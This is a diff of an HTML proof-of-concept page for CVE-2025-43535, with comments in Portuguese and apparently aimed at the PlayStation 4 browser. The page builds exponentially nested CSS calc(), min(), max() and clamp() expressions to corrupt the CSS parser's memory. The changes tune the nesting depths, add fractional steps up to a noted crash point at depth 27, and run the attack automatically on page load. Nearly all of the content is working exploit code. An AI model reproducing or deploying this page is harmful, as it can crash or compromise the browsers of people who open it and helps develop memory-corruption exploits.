@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43535 PoC — V1 Agressiva </title>
+<title>CVE-2025-43535 PoC — V1 Fracionada</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px;
@@ -11,7 +11,7 @@
 </style>
 </head>
 <body>
-<h3>CVE-2025-43535 — Memory Corruption Parser (V1 Agressiva) 3</h3>
+<h3>CVE-2025-43535 — Memory Corruption (Degraus Fracionados a partir do 24)</h3>
 <div id="log"></div>
 
 <script>
@@ -22,11 +22,11 @@ const L=(m,c)=>{const d=document.getElementById('log');
   d.scrollTop=d.scrollHeight;
 };
 
-// Respiro para o GC limpar as alocações da iteração *anterior*
-const yieldGC = () => new Promise(r => setTimeout(r, 60));
+// Respiro mais longo (100ms) para garantir que o PS4 limpe a memória pesada entre os testes
+const yieldGC = () => new Promise(r => setTimeout(r, 100));
 
 async function variant1_css_calc_deep() {
-  L("[V1] CSS calc() + math (Estrutura Exponencial Original)...");
+  L("[V1] Iniciando CSS calc() + math (Estrutura Exponencial)...");
 
   const el = document.createElement('div');
   el.style.cssText = 'position:absolute;top:-9999px';
@@ -40,8 +40,8 @@ async function variant1_css_calc_deep() {
     return `calc(${makeDeepcalc(depth-1, unit)} + ${depth}${unit})`;
   }
 
-  const depths = [1, 2, 3, 4, 5];
-  const units = ['px', 'em', 'rem', '%', 'vw', 'vh', 'fr'];
+  const depths = [5, 10, 20, 30, 50, 100, 150];
+  const units = ['px', 'em', '%'];
 
   for (const depth of depths) {
     for (const unit of units) {
@@ -56,39 +56,66 @@ async function variant1_css_calc_deep() {
         void el.offsetWidth;
       } catch(e) {}
     }
-    await yieldGC(); // Limpa as strings geradas pelo calc()
+    await yieldGC();
   }
 
-  // 2. math functions originais (Agressividade restaurada)
+  // 2. math functions originais (Agressividade Exponencial)
   function makeMathNested(depth) {
     if (depth <= 0) return '10px';
     const funcs = ['min', 'max', 'clamp'];
     const f = funcs[depth % 3];
     if (f === 'clamp') {
-      return `clamp(${makeMathNested(depth-1)}, ${depth*4}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
+      return `clamp(${makeMathNested(depth-1)}, ${depth*5}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
     }
     return `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
   }
 
-  // Limite cauteloso: 25. 
-  L("[V1] Executando loop math agressivo (limite = 25)...");
-  for (let d = 1; d <= 26; d++) {
+  // FASE 1: Loop agressivo até o 24 (Teto seguro absoluto)
+  L("[V1] Executando loop math agressivo normal (1 a 24)...");
+  for (let d = 1; d <= 24; d++) {
     try {
-      const expr = makeMathNested(d);
-      el.style.width = expr;
-      el.style.height = expr;
+      el.style.width = makeMathNested(d);
       void el.offsetWidth;
-      L(`[V1] Math depth ${d} processado.`);
     } catch(e) {}
     
-    // CRÍTICO: Pausa a partir da iteração 20 para o GC destruir a string gigante anterior
-    // Isso impede que o lixo do d=23 some com o d=24 e cause OOM.
-    if (d >= 23) await yieldGC(); 
+    // Pausa o Event Loop para o GC agir
+    if (d >= 15) await yieldGC(); 
+  }
+
+  L("[V1] Alcançou nível 24 com segurança. Entrando na zona de precisão...", "ok");
+  await yieldGC();
+
+  // FASE 2: Degraus Fracionados (Entre 24 e 27)
+  // Construindo galhos assimétricos para aumentar o consumo de RAM aos poucos
+  const passosIntermediarios = [
+    { nome: "24.5", expr: `min(${makeMathNested(24)}, ${makeMathNested(23)})` },
+    { nome: "25.0", expr: makeMathNested(25) },
+    { nome: "25.5", expr: `max(${makeMathNested(25)}, ${makeMathNested(24)})` },
+    { nome: "26.0", expr: makeMathNested(26) },
+    { nome: "26.2", expr: `clamp(${makeMathNested(26)}, 10px, ${makeMathNested(24)})` },
+    { nome: "26.5", expr: `min(${makeMathNested(26)}, ${makeMathNested(25)})` },
+    { nome: "26.8", expr: `clamp(${makeMathNested(26)}, 10px, ${makeMathNested(25)})` },
+    { nome: "27.0", expr: makeMathNested(27) } // O ponto de crash conhecido
+  ];
+
+  for (const passo of passosIntermediarios) {
+    try {
+      L(`[V1] Testando passo intermediário ${passo.nome}...`);
+      el.style.width = passo.expr;
+      void el.offsetWidth;
+      L(`[V1] Passo ${passo.nome} executado limpo!`, "ok");
+    } catch(e) {
+      L(`[V1] Exceção JS no passo ${passo.nome}.`, "fail");
+    }
+    
+    // Limpeza forçada após cada aberração fracionada
+    el.style.width = '10px';
+    await yieldGC(); 
   }
 
   // 3. Custom properties original
-  L("[V1] Registrando Custom Properties...");
-  for (let i = 0; i < 2; i++) {
+  L("[V1] Registrando Custom Properties (Finalização)...");
+  for (let i = 0; i < 15; i++) {
     try {
       const propName = `--test-prop-${i}`;
       if (typeof CSS !== 'undefined' && CSS.registerProperty) {
@@ -112,14 +139,14 @@ async function variant1_css_calc_deep() {
 async function main() {
   try {
     await variant1_css_calc_deep();
-    L("=== COMPLETO ===", "ok");
-    L("Se ocorrer um crash agora, as chances de corrupção real no parser são altíssimas.", "crash");
+    L("=== EXECUÇÃO COMPLETA SEM OOM ===", "ok");
+    L("O navegador sobreviveu até o fim. Ajuste os passos se necessário.", "info");
   } catch(e) {
     L("EXCEÇÃO FATAL: " + e.toString(), "fail");
   }
 }
 
-window.addEventListener('load', () => setTimeout(main, 300));
+window.addEventListener('load', () => setTimeout(main, 500));
 </script>
 </body>
 </html>
